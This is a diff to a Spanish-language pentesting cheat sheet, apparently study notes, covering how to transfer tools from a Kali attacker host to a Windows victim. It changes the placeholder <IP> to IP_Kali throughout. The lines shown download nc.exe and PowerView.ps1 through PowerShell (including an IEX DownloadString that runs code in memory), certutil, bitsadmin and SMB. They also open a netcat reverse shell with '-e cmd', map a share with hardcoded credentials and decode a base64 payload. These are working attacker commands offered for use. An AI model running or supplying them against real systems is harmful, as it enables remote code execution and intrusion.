@@ -63,20 +63,20 @@ EXTRA:
 ### Víctima Windows — Descargar (Subir) a Windows 
 
 ```bash
-1  ❯ powershell -c "Invoke-WebRequest http://<IP>/nc.exe -OutFile nc.exe"
-   ❯ powershell -c "IWR http://<IP>/nc.exe -OutFile nc.exe"
-   ❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>/nc.exe','nc.exe')"
+1  ❯ powershell -c "Invoke-WebRequest http://IP_Kali/nc.exe -OutFile nc.exe"
+   ❯ powershell -c "IWR http://IP_Kali/nc.exe -OutFile nc.exe"
+   ❯ powershell -c "(New-Object Net.WebClient).DownloadFile('http://IP_Kali/nc.exe','nc.exe')"
    # PowerShell → varias alternativas si una falla
-   ❯ IEX (New-Object Net.WebClient).DownloadString('http://Kali/PowerView.ps1')
+   ❯ IEX (New-Object Net.WebClient).DownloadString('http://IP_Kali/PowerView.ps1')
 
-2  ❯ certutil -urlcache -f http://<IP>/nc.exe C:\Users\Public\nc.exe
-   ❯ certutil.exe -f -urlcache -split http://<IP>/nc.exe C:\Temp\nc.exe
-   ❯ C:\Windows\System32\certutil.exe -urlcache -f http://<IP>/nc.exe C:\Temp\nc.exe
+2  ❯ certutil -urlcache -f http://IP_Kali/nc.exe C:\Users\Public\nc.exe
+   ❯ certutil.exe -f -urlcache -split http://IP_Kali/nc.exe C:\Temp\nc.exe
+   ❯ C:\Windows\System32\certutil.exe -urlcache -f http://IP_Kali/nc.exe C:\Temp\nc.exe
    # Certutil → siempre disponible en Windows porque es un LOLBAS → muy fiable
 
-3 ❯ copy \\<IP>\smbFolder\File.exe File.exe
+3 ❯ copy \\IP_Kali\smbFolder\File.exe File.exe
    # Copiar archivo desde SMB de Kali a Windows
-   ❯ \\<IP>\smbFolder\nc.exe -e cmd <IP> 443
+   ❯ \\IP_Kali\smbFolder\nc.exe -e cmd IP_Kali 443
    # Ejecutar directamente desde el SMB sin copiar al disco
 
 4 ❯ net use x: \\IP_Kali\smbFolder /u:omar omar123
@@ -90,7 +90,7 @@ EXTRA:
 
 
 EXTRA:
-   ❯ bitsadmin /transfer job http://<IP>/nc.exe C:\Temp\nc.exe
+   ❯ bitsadmin /transfer job http://IP_Kali/nc.exe C:\Temp\nc.exe
    # BITS → descarga en segundo plano → a veces evita restricciones
 
    ❯ certutil -decode input.b64 output.exe
